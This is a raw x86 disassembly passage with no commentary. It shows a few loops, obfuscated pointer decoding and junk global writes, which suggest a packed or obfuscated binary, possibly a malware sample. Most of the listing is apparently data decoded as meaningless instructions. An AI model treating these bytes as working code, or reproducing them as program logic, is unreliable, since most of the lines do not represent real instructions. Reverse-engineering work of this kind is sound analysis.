  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0xbe103a68,al
  40ea30:	mov    dh,0x71
  40ea32:	add    eax,0x7e7ea3ef
  40ea37:	push   cs
  40ea38:	jl     0x40eab8
  40ea3a:	jle    0x40e9e6
  40ea3c:	add    eax,0x60b3a444
  40ea41:	imul   ebx,ebp,0x5a
  40ea44:	jne    0x40ea7e
  40ea46:	(bad)  
  40ea47:	(bad)  [ebx-0x71]
  40ea4a:	jbe    0x40ea48
  40ea4c:	test   DWORD PTR [edi+0x1d8300da],eax
  40ea52:	or     al,0x52
  40ea54:	dec    edx
  40ea55:	bound  edi,QWORD PTR [edx*2+0x2505f8a3]
  40ea5c:	adc    al,0xc3
  40ea5e:	jns    0x40eac7
  40ea60:	(bad)  
  40ea61:	(bad)  
  40ea62:	mov    dh,0xf3
  40ea64:	shr    BYTE PTR [ebx-0x66],cl
  40ea67:	mov    esp,0x8d109785
  40ea6c:	jmp    0x40eaa3
  40ea6e:	popf   
  40ea6f:	push   ebx
  40ea70:	mov    esi,0x1f1e59a0
  40ea75:	pop    eax
  40ea76:	xlat   BYTE PTR ds:[ebx]
  40ea77:	ss int 0x4d
  40ea7a:	sub    eax,ecx
  40ea7c:	add    edi,eax
  40ea7e:	xlat   BYTE PTR ds:[ebx]
  40ea7f:	je     0x40ea20
  40ea81:	cmp    DWORD PTR [eax+eax*1+0x62d6ef1e],eax
  40ea88:	xchg   edi,eax
  40ea89:	cld    
  40ea8a:	push   ecx
  40ea8b:	xor    BYTE PTR [ebp-0x29],cl
  40ea8e:	sti    
  40ea8f:	mov    ebp,0x6d7ffe66
  40ea94:	retf   
  40ea95:	mov    edi,0x500875d0
  40ea9a:	lock daa 
  40ea9c:	jnp    0x40ea32
  40ea9e:	cld    
  40ea9f:	mov    ch,0x41
  40eaa1:	ror    BYTE PTR ds:0x10814df0,cl
  40eaa7:	dec    edx
  40eaa8:	mov    bl,al
  40eaaa:	jbe    0x40eb1e
  40eaac:	pop    esp
  40eaad:	(bad)  
  40eaae:	je     0x40ea7f
  40eab0:	sub    DWORD PTR [ebx-0x70],ebx
  40eab3:	mov    edi,0xf54286a7
  40eab8:	dec    ebx
  40eab9:	ins    BYTE PTR es:[edi],dx
  40eaba:	scas   al,BYTE PTR es:[edi]
  40eabb:	pop    ebp
  40eabc:	push   es
  40eabd:	mov    esi,DWORD PTR [edi+0x7]
  40eac0:	or     esi,0x886e178b
  40eac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eac7:	xor    BYTE PTR [eax],bl
  40eac9:	addr16 jl 0x40eb43
  40eacc:	jb     0x40eb30
  40eace:	add    eax,0xb971c412
  40ead3:	xchg   esp,eax
  40ead4:	cmp    BYTE PTR [ecx],dl
  40ead6:	jge    0x40eb00
  40ead8:	sbb    ebp,DWORD PTR [edi]
  40eada:	test   eax,0xa6336805
  40eadf:	push   ds
  40eae0:	mov    eax,0x109b051c
  40eae5:	mov    DWORD PTR [esi],ecx
  40eae7:	inc    edi
  40eae8:	mov    DWORD PTR ds:0xbbe13e74,ecx
  40eaee:	inc    esi
  40eaef:	pop    es
  40eaf0:	(bad)  
  40eaf1:	lock inc eax
  40eaf3:	mov    esi,0xac86e8a3
  40eaf8:	add    DWORD PTR [ebx-0x4851591f],ecx
  40eafe:	shr    DWORD PTR [esi],0x32
  40eb01:	sahf   
  40eb02:	mov    dh,0xfa
  40eb04:	mov    dh,0x3b
  40eb06:	sub    ebp,DWORD PTR ds:0xa43491db
  40eb0c:	lahf   
  40eb0d:	sar    ebx,cl
  40eb0f:	adc    dl,dh
  40eb11:	jae    0x40eb19
  40eb13:	out    dx,al
  40eb14:	pop    es
  40eb15:	outs   dx,DWORD PTR ds:[esi]
  40eb16:	mov    al,0x8
  40eb18:	xor    ebp,esp
  40eb1a:	jp     0x40eb07
  40eb1c:	pop    ecx
  40eb1d:	mov    edx,DWORD PTR [ebx+ebx*2-0x9]
  40eb21:	mov    esp,0x6b4dcadf
  40eb26:	xor    BYTE PTR [edx+0x74f756ad],bl
  40eb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb2d:	jmp    0x8b43:0x117dfded
  40eb34:	xchg   edi,eax
  40eb35:	mov    eax,0xf68febb
  40eb3a:	push   ss
  40eb3b:	lds    ecx,FWORD PTR [ecx]
  40eb3d:	les    eax,FWORD PTR [ebx]
  40eb3f:	inc    ecx
  40eb40:	pop    esp
  40eb41:	jle    0x40eb14
  40eb43:	sub    eax,DWORD PTR [ecx-0x3f7213ac]
  40eb49:	push   cs
  40eb4a:	fs cli 
  40eb4c:	cld    
  40eb4d:	hlt    
  40eb4e:	xchg   esi,eax
  40eb4f:	in     eax,dx
  40eb50:	mov    ebp,0xdf936c19
  40eb55:	add    ebx,edx
  40eb57:	push   edx
  40eb58:	das    
  40eb59:	(bad)  
  40eb5a:	gs (bad) 
  40eb5c:	adc    ebp,ecx
  40eb5e:	dec    esp
  40eb5f:	das    
  40eb60:	out    dx,al
  40eb61:	dec    esp
  40eb62:	and    al,0x38
  40eb64:	popa   
  40eb65:	mov    ebx,0xe7319ad8
  40eb6a:	shr    BYTE PTR [eax],1
  40eb6c:	sub    BYTE PTR [esi],0xb1
  40eb6f:	push   cs
  40eb70:	aas    
  40eb71:	retf   
  40eb72:	add    ecx,0x39f86205
  40eb78:	push   edx
  40eb79:	repz pop ss
  40eb7b:	xchg   ebx,eax
  40eb7c:	fxch   st(1)
  40eb7e:	fwait
  40eb7f:	and    cl,cl
  40eb81:	sub    eax,0xba70fec8
  40eb86:	or     BYTE PTR [esi-0x25],cl
  40eb89:	fnstenv [eax+0x2f]
  40eb8c:	fdiv   DWORD PTR [esi-0x6fa3017d]
  40eb92:	cmp    eax,0xf8dff7f7
  40eb97:	dec    eax
  40eb98:	nop
  40eb99:	in     al,0xa2
  40eb9b:	clc    
  40eb9c:	inc    ebp
  40eb9d:	in     eax,0x5e
  40eb9f:	sub    eax,0x81de62e2
  40eba4:	fwait
  40eba5:	mov    DWORD PTR [ecx+0x12520821],edi
  40ebab:	imul   esp,ebx,0x7d859a3c
  40ebb1:	jmp    0xe0b6:0x5c307973
  40ebb8:	sbb    BYTE PTR [ecx],al
  40ebba:	mov    ebp,0x522320e7
  40ebbf:	stos   BYTE PTR es:[edi],al
  40ebc0:	imul   ebx,DWORD PTR [eax+0x38b496c9],0x6e86358a
  40ebca:	adc    eax,0xbfcbced9
  40ebcf:	in     eax,dx
  40ebd0:	and    al,0x38
  40ebd2:	mov    ebx,0x1602340c
  40ebd7:	push   0xffffffc1
  40ebd9:	inc    ecx
  40ebda:	sbb    edx,DWORD PTR [eax+0x3c65505e]
  40ebe0:	les    ebp,FWORD PTR [eax-0x8e0bcb2]
  40ebe6:	pop    ds
  40ebe7:	aaa    
  40ebe8:	retf   
  40ebe9:	and    DWORD PTR [esi],esp
  40ebeb:	ficomp DWORD PTR [ecx]
  40ebed:	xor    ebx,DWORD PTR [edi-0xa6299b4]
  40ebf3:	arpl   WORD PTR [esi-0x5efdb589],sp
  40ebf9:	xlat   BYTE PTR ds:[ebx]
  40ebfa:	les    si,DWORD PTR [ebx]
  40ebfd:	mov    ds:0x6863fe9b,al
  40ec02:	outs   dx,DWORD PTR ds:[esi]
  40ec03:	retf   0xd2f0
  40ec06:	fdivr  DWORD PTR [ebx+0x11]
  40ec09:	mov    ah,0xc9
  40ec0b:	aaa    
  40ec0c:	and    DWORD PTR [ebx+0x4],0x3eeca52e
  40ec13:	pop    dx
  40ec15:	call   0x214d:0xeb2122e
  40ec1c:	mov    eax,0xf81b9086
  40ec21:	in     eax,dx
  40ec22:	hlt    
  40ec23:	bound  edi,QWORD PTR [eax+0x76]
  40ec26:	or     ah,cl
  40ec28:	add    DWORD PTR gs:[edi],edx
  40ec2b:	fist   DWORD PTR [esi-0x50845ea1]
  40ec31:	popf   
  40ec32:	aad    0x7a
  40ec34:	pop    ecx
  40ec35:	jmp    0x40ebdc
  40ec37:	cmp    esp,DWORD PTR [edi-0x7b]
  40ec3a:	dec    esi
  40ec3b:	loop   0x40ec07
  40ec3d:	retf   
  40ec3e:	mov    ds:0xd9e64815,eax
  40ec43:	jmp    0x51b8ced2
  40ec48:	aad    0x8
  40ec4a:	dec    edx
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [edx+ebp*1-0xa8ff15],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	call   0xa8daff9c
  40ecd1:	dec    esi
  40ecd2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40ecd4:	mov    edi,0xa20a7194
  40ecd9:	pop    ss
  40ecda:	les    esi,FWORD PTR [edi]
  40ecdc:	jmp    0xbe36:0x3ebf48a6
  40ece3:	das    
  40ece4:	dec    eax
  40ece5:	aaa    
  40ece6:	sbb    eax,0x5d8a0bc7
  40eceb:	add    eax,0xaddcf5fe
  40ecf0:	dec    ebx
  40ecf1:	aaa    
  40ecf2:	dec    ecx
  40ecf3:	popa   
  40ecf4:	loope  0x40ed6d
  40ecf6:	ret    0x34c1
  40ecf9:	adc    BYTE PTR [eax-0xc],cl
  40ecfc:	in     al,0xfe
  40ecfe:	popa   
  40ecff:	sbb    eax,0x7c572268
  40ed04:	and    eax,DWORD PTR [ecx+edx*8-0xd54041b]
  40ed0b:	add    eax,DWORD PTR [ecx-0x5e8b3365]
  40ed11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed12:	(bad)  
  40ed13:	cmc    
  40ed14:	ins    BYTE PTR es:[edi],dx
  40ed15:	mov    ch,0x7a
  40ed17:	sbb    BYTE PTR ds:0xa8565ec5,cl
  40ed1d:	xchg   ecx,eax
  40ed1e:	sar    DWORD PTR [eax+edi*4],1
  40ed21:	test   eax,0xf5c278b3
  40ed26:	jnp    0x40ecad
  40ed28:	scas   al,BYTE PTR es:[edi]
  40ed29:	push   ds
  40ed2a:	scas   al,BYTE PTR es:[edi]
  40ed2b:	inc    eax
  40ed2c:	push   es
  40ed2d:	mov    ebp,0xfde486a7
  40ed32:	icebp  
  40ed33:	fs arpl ax,dx
  40ed36:	xchg   ebx,eax
  40ed37:	sub    DWORD PTR [esi+0x18],eax
  40ed3a:	dec    ebp
  40ed3b:	push   edi
  40ed3c:	xor    ecx,DWORD PTR ds:0x11b4f233
  40ed42:	div    DWORD PTR [edx]
  40ed44:	jl     0x40eccd
  40ed46:	adc    ecx,eax
  40ed48:	push   0x90b439e6
  40ed4d:	adc    esi,esi
  40ed4f:	std    
  40ed50:	sbb    eax,0xf82894bf
  40ed55:	pop    ss
  40ed56:	fisttp DWORD PTR [eax]
  40ed58:	call   0x8660dd42
  40ed5d:	pushf  
  40ed5e:	aad    0xa9
  40ed60:	push   esp
  40ed61:	int3   
  40ed62:	iret   
  40ed63:	fldl2e 
  40ed65:	inc    ebx
  40ed66:	lea    ebp,ss:[edi-0x185a33dc]
  40ed6d:	and    DWORD PTR [eax],ebp
  40ed6f:	mov    ch,0x37
  40ed71:	nop
  40ed72:	out    0x63,eax
  40ed74:	stc    
  40ed75:	lock sub DWORD PTR [ecx+0x29b09c42],esp
  40ed7c:	repnz mov edx,0x7629200b
  40ed82:	xchg   esp,eax
  40ed83:	(bad)  
  40ed84:	xor    edx,DWORD PTR [ebp-0x25]
  40ed87:	jp     0x40ed1c
  40ed89:	in     eax,dx
  40ed8a:	stos   DWORD PTR es:[edi],eax
  40ed8b:	jbe    0x40ed84
  40ed8d:	enter  0xfaa6,0xb9
  40ed91:	(bad)
  40ed94:	daa    
  40ed95:	stos   BYTE PTR es:[edi],al
  40ed96:	in     al,0x73
  40ed98:	aam    0x79
  40ed9a:	dec    eax
  40ed9b:	cmp    bh,BYTE PTR [ebx+0x38155d16]
  40eda1:	push   cs
  40eda2:	or     BYTE PTR [edx-0x6c],0x3c
  40eda6:	fs rcr edi,cl
  40eda9:	mov    dh,0x64
  40edab:	xchg   ebp,eax
  40edac:	xor    BYTE PTR [esi],bh
  40edae:	inc    edx
  40edaf:	and    ebp,DWORD PTR [ebx]
  40edb1:	adc    BYTE PTR [edi],bh
  40edb3:	repz fistp DWORD PTR [edx+0x3b3a74d7]
  40edba:	test   BYTE PTR [esp+eiz*8],dl
  40edbd:	push   edi
  40edbe:	mov    ecx,0x1f812fd4
  40edc3:	pushf  
  40edc4:	pop    edi
  40edc5:	cli    
  40edc6:	cmp    BYTE PTR [esi-0x11],bl
  40edc9:	inc    edi
  40edca:	scas   eax,DWORD PTR es:[edi]
  40edcb:	pusha  
  40edcc:	xor    ecx,DWORD PTR [ecx-0x64cb89e8]
  40edd2:	mov    cl,0x78
  40edd4:	sbb    DWORD PTR [ebx-0xe5e40d4],0x1a6d3cff
  40edde:	(bad)  
  40eddf:	aad    0xa8
  40ede1:	adc    al,0xba
  40ede3:	adc    ah,BYTE PTR [eax-0x6]
  40ede6:	dec    ebp
  40ede7:	lds    ebx,FWORD PTR [ebp-0x4bb758a]
  40eded:	es lahf 
  40edef:	xor    DWORD PTR [edx],0xffffffd3
  40edf2:	leave  
  40edf3:	mov    cl,0xd3
  40edf5:	inc    edi
  40edf6:	dec    edi
  40edf7:	adc    BYTE PTR [ecx+ecx*8],al
  40edfa:	xor    dl,dh
  40edfc:	sbb    BYTE PTR [ebx-0x4d3c90af],dl
  40ee02:	call   0x603a:0xa448770a
  40ee09:	or     al,ah
  40ee0b:	fdiv   DWORD PTR [bx+si+0x1d7e]
  40ee10:	mov    bl,0x9a
  40ee12:	push   eax
  40ee13:	cs mov ecx,0x67da06b3
  40ee19:	loopne 0x40ed9b
  40ee1b:	mov    ah,0xde
  40ee1d:	in     eax,dx
  40ee1e:	mov    fs,WORD PTR [eax+0x7997fcea]
  40ee24:	daa    
  40ee25:	pop    ss
  40ee26:	test   BYTE PTR [ebx+0x286c66e6],bh
  40ee2c:	hlt    
  40ee2d:	js     0x40ede9
  40ee2f:	ficom  DWORD PTR [edx+0x37]
  40ee32:	stos   BYTE PTR es:[edi],al
  40ee33:	sbb    al,0x11
  40ee35:	or     dl,BYTE PTR [esi+0x59]
  40ee38:	jmp    0x40ee49
  40ee3a:	cmp    DWORD PTR [edx-0xc],esp
  40ee3d:	xchg   edx,eax
  40ee3e:	jo     0x40edd3
  40ee40:	bound  edi,QWORD PTR [edx+0x74]
  40ee43:	dec    eax
  40ee44:	bound  eax,QWORD PTR [esi+0x42]
  40ee47:	scas   eax,DWORD PTR es:[edi]
  40ee48:	das    
  40ee49:	mov    al,0x8d
  40ee4b:	aas    
  40ee4c:	dec    edx
  40ee4d:	and    al,0xa
  40ee4f:	mov    eax,DWORD PTR [eax+0x5f2e8c10]
  40ee55:	adc    BYTE PTR [edx-0x1a],0xce
  40ee59:	pop    edi
  40ee5a:	lods   al,BYTE PTR ds:[esi]
  40ee5b:	fs cdq 
  40ee5d:	mov    ah,0x22
  40ee5f:	mov    esp,0x39fc3697
  40ee64:	mov    bh,0xd7
  40ee66:	or     ecx,DWORD PTR [edi-0x58]
  40ee69:	fsubr  QWORD PTR [esp+edi*1]
  40ee6c:	jp     0x40eee4
  40ee6e:	mov    al,ds:0x1319f24d
  40ee73:	shl    DWORD PTR [ebp+0x4e054c8b],0x31
  40ee7a:	mov    bl,0x96
  40ee7c:	jge    0x40ee2e
  40ee7e:	inc    esp
  40ee7f:	test   dh,al
  40ee81:	loop   0x40ee2d
  40ee83:	or     esp,DWORD PTR [ebx+0x7d]
  40ee86:	loop   0x40eeb6
  40ee88:	imul   eax,DWORD PTR [ebx-0x57],0x7e
  40ee8c:	je     0x40ee10
  40ee8e:	fisub  DWORD PTR [esi+0x4f2913a]
  40ee94:	mov    WORD PTR [edx+0x129aab6b],es
  40ee9a:	nop
  40ee9b:	gs (bad) 
  40ee9d:	je     0x40eefe
  40ee9f:	arpl   bp,bp
  40eea1:	aam    0x3f
  40eea3:	out    0x42,al
  40eea5:	inc    ecx
  40eea6:	lock inc DWORD PTR [ebx-0x54]
  40eeaa:	clc    
  40eeab:	ins    BYTE PTR es:[edi],dx
  40eeac:	stos   BYTE PTR es:[edi],al
  40eead:	cmp    BYTE PTR [esi-0x6c26fbd2],0xaa
  40eeb4:	icebp  
  40eeb5:	add    eax,0x85e4d661
  40eeba:	adc    ch,BYTE PTR [ebp-0x71]
  40eebd:	push   es
  40eebe:	shr    esi,cl
  40eec0:	mov    BYTE PTR [ebp-0xdea1276],al
  40eec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec7:	push   esp
  40eec8:	jne    0x40ef26
  40eeca:	mov    al,0xab
  40eecc:	shr    esi,1
  40eece:	xor    BYTE PTR [ebp+0x51],0xee
  40eed2:	add    BYTE PTR [esi+0x60],al
  40eed5:	sbb    al,0xe1
  40eed7:	cmp    al,0x89
  40eed9:	ret    0xec7a
  40eedc:	call   0x404a7e
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x4398ef46],0x8fc7a0ff
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40eef6
  40ef11:	pop    ds
  40ef12:	dec    ecx
  40ef13:	push   ss
  40ef14:	test   al,0xe
  40ef16:	inc    ebp
  40ef17:	pop    eax
  40ef18:	push   0x928ded9
  40ef1d:	mov    ds:0x2afc927d,al
  40ef22:	out    0x8d,eax
  40ef24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef25:	pop    ss
  40ef26:	mov    ebx,0x7f8ba03
  40ef2b:	cdq    
  40ef2c:	xchg   edx,eax
  40ef2d:	mov    ebx,0xd1f60fbe
  40ef32:	(bad)  
  40ef33:	in     eax,0x4
  40ef35:	inc    edi
  40ef36:	sub    eax,0xa739fe66
  40ef3b:	loopne 0x40ef1f
  40ef3d:	and    al,0xde
  40ef3f:	mov    dh,0x1
  40ef41:	xchg   ecx,eax
  40ef42:	les    edx,FWORD PTR ds:0xd0aef1ea
  40ef48:	je     0x40eef3
  40ef4a:	(bad)  
  40ef4b:	sbb    al,0x23
  40ef4d:	xor    eax,0xa53fc52a
  40ef52:	dec    edi
  40ef53:	bound  esi,QWORD PTR [esi+0x6d3bb5c2]
  40ef59:	and    bl,BYTE PTR ds:0x16bba134
  40ef5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef60:	add    ch,ah
  40ef62:	inc    eax
  40ef63:	in     eax,0xda
  40ef65:	mov    edx,0x6bc86fd4
  40ef6a:	xchg   ebx,eax
  40ef6b:	nop
  40ef6c:	mov    dl,0x69
  40ef6e:	test   DWORD PTR [esp+edx*4-0x67],ebp
  40ef72:	mov    eax,0x3efbb092
  40ef77:	jecxz  0x40ef87
  40ef79:	sar    BYTE PTR [esi+eiz*8-0x3],1
  40ef7d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef7f:	pop    eax
  40ef80:	sbb    BYTE PTR [ebp-0x494df409],ah
  40ef86:	int3   
  40ef87:	add    eax,DWORD PTR [eax+eax*1]
  40ef8a:	sbb    BYTE PTR [ebx+0x8],dl
  40ef8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef8e:	or     BYTE PTR [ecx+0x49],bl
  40ef91:	es mov ebp,0x6e29aa27
  40ef97:	inc    ebp
  40ef98:	rcl    DWORD PTR [ebx+0x1d],1
  40ef9b:	dec    edx
  40ef9c:	inc    esp
  40ef9d:	push   0x3c
  40ef9f:	or     al,0x8c
  40efa1:	inc    eax
  40efa2:	jmp    0x60e6:0x93d434b3
  40efa9:	aam    0xe7
  40efab:	aam    0xd9
  40efad:	add    eax,0x2dcb594f
  40efb2:	cmp    BYTE PTR [edx],bh
  40efb4:	xor    ch,dl
  40efb6:	and    al,0x4f
  40efb8:	dec    ecx
  40efb9:	jl     0x40efc4
  40efbb:	(bad)  
  40efbc:	mov    cl,0x1e
  40efbe:	aaa    
  40efbf:	repz or bl,BYTE PTR [edi+0x7353950e]
  40efc6:	jecxz  0x40efa5
  40efc8:	sub    bh,dl
  40efca:	add    eax,0x33bfd597
  40efcf:	leave  
  40efd0:	adc    BYTE PTR [edx+0xb],ch
  40efd3:	pusha  
  40efd4:	pop    esi
  40efd5:	jle    0x40f053
  40efd7:	fisttp WORD PTR [eax+0x5672f059]
  40efdd:	adc    eax,0xe2c43036
  40efe2:	push   ecx
  40efe3:	push   ecx
  40efe4:	xchg   BYTE PTR [ebx-0x5d],dl
  40efe7:	lods   eax,DWORD PTR ds:[esi]
  40efe8:	retf   
  40efe9:	inc    ebp
  40efea:	cld    
  40efeb:	into   
  40efec:	in     eax,dx
  40efed:	mov    ch,BYTE PTR [eax-0x4b]
  40eff0:	je     0x40f057
  40eff2:	dec    ecx
  40eff3:	outs   dx,DWORD PTR ds:[esi]
  40eff4:	and    al,0x19
  40eff6:	aaa    
  40eff7:	cdq    
  40eff8:	xchg   edx,eax
  40eff9:	ffree  st(1)
  40effb:	xchg   ecx,eax
  40effc:	ins    BYTE PTR es:[edi],dx
  40effd:	mov    ah,BYTE PTR [edx]
  40efff:	dec    edi
  40f000:	cdq    
  40f001:	jecxz  0x40efa9
  40f003:	in     al,0x7f
  40f005:	mov    DWORD PTR [ebx+0x10ce9d7b],esp
  40f00b:	sbb    bl,BYTE PTR [ebx]
  40f00d:	xchg   edx,eax
  40f00e:	gs or  eax,0x5702804
  40f014:	fld    DWORD PTR [ebx]
  40f016:	or     edx,DWORD PTR [ebp-0x241ab5d1]
  40f01c:	mov    dh,0x65
  40f01e:	cmp    BYTE PTR [ecx+0x38743cee],cl
  40f024:	aas    
  40f025:	and    eax,0xf3df81f9
  40f02a:	in     al,0xa4
  40f02c:	or     esi,DWORD PTR [ecx]
  40f02e:	arpl   WORD PTR [esi],dx
  40f030:	inc    edi
  40f031:	mov    ebx,0x9bc0a617
  40f036:	mov    eax,0x80a523cb
  40f03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03c:	add    eax,0x5e4e14de
  40f041:	scas   al,BYTE PTR es:[edi]
  40f042:	xor    ch,BYTE PTR [ebx]
  40f044:	retf   0x77af
  40f047:	dec    edi
  40f048:	or     esp,DWORD PTR [eax]
  40f04a:	mov    bh,0x8c
  40f04c:	sub    bl,ch
  40f04e:	fmulp  st(2),st
  40f050:	push   0x5258909c
  40f055:	add    DWORD PTR [esi-0x14cc8e96],edx
  40f05b:	or     ah,BYTE PTR [esi+ebp*2-0x2ef969da]
  40f062:	out    0x3,al
  40f064:	push   ebx
  40f065:	scas   al,BYTE PTR es:[edi]
  40f066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f067:	ror    BYTE PTR ds:0x99d65a3d,0x9f
  40f06e:	iret   
  40f06f:	cmp    eax,0x96891d2b
  40f074:	jb     0x40f087
  40f076:	pop    esi
  40f077:	leave  
  40f078:	push   ebx
  40f079:	mov    ebx,0x5297db63
  40f07e:	mov    al,ds:0x2eb56505
  40f083:	outs   dx,DWORD PTR ds:[esi]
  40f084:	(bad)  
  40f088:	lock mov dl,0x7d
  40f08b:	adc    BYTE PTR [edx+eiz*8],dl
  40f08e:	mov    WORD PTR [ebp+0x48413646],fs
  40f094:	and    esp,esi
  40f096:	xchg   esi,eax
  40f097:	retf   
  40f098:	cdq    
  40f099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f09a:	jmp    0xcee32559
  40f09f:	xchg   DWORD PTR [eax+0x19],ebp
  40f0a2:	fnstsw WORD PTR [esi-0x2]
  40f0a5:	popf   
  40f0a6:	mov    ?,esi
  40f0a8:	pop    ss
  40f0a9:	popa   
  40f0aa:	pop    edi
  40f0ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0ad:	jmp    0x7c32:0xf499fd9a
  40f0b4:	jle    0x40f07a
  40f0b6:	pop    ds
  40f0b7:	mov    cl,bl
  40f0b9:	ins    DWORD PTR es:[edi],dx
  40f0ba:	mov    ebp,0x768910de
  40f0bf:	xchg   DWORD PTR [ebx+0x1e],edi
  40f0c2:	sti    
  40f0c3:	xor    al,0x3d
  40f0c5:	inc    edx
  40f0c6:	ins    DWORD PTR es:[edi],dx
  40f0c7:	icebp  
  40f0c8:	and    DWORD PTR [eax],ecx
  40f0ca:	xchg   DWORD PTR [ebx+ebx*2-0x11f0529a],ebx
  40f0d1:	cmp    bl,0x89
  40f0d4:	and    BYTE PTR [ebp+0x3c8262d7],ch
  40f0da:	pop    ds
  40f0db:	test   eax,0xcf27331d
  40f0e0:	loopne 0x40f0a8
  40f0e2:	and    DWORD PTR [ecx-0x64da3008],esi
  40f0e8:	push   0x36
  40f0ea:	lods   al,BYTE PTR ss:[esi]
  40f0ec:	outs   dx,DWORD PTR ds:[esi]
  40f0ed:	or     eax,0xc96e9ba4
  40f0f2:	scas   al,BYTE PTR es:[edi]
  40f0f3:	cli    
  40f0f4:	mov    bh,0x79
  40f0f6:	out    0xe4,al
  40f0f8:	mov    ecx,0x71cffe51
  40f0fd:	bound  edx,QWORD PTR [ecx]
  40f0ff:	jmp    0x40f08f
  40f101:	imul   ebp,DWORD PTR [esi],0xfffffff6
  40f104:	test   BYTE PTR [ebp-0x2b],dh
  40f107:	repz dec eax
  40f109:	or     DWORD PTR [esi-0x2e],esp
  40f10c:	gs and al,0x72
  40f10f:	mov    ebx,DWORD PTR [edi]
  40f111:	add    ch,BYTE PTR [esi]
  40f113:	sub    al,0xfb
  40f115:	imul   ebx,DWORD PTR [edi+0x35421f16],0xa9ba3853
  40f11f:	xor    eax,DWORD PTR [ecx+0x1a3ff]
  40f125:	add    BYTE PTR [edi],cl
  40f127:	test   DWORD PTR [edi+0x0],ecx
  40f12a:	add    BYTE PTR [eax],al
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
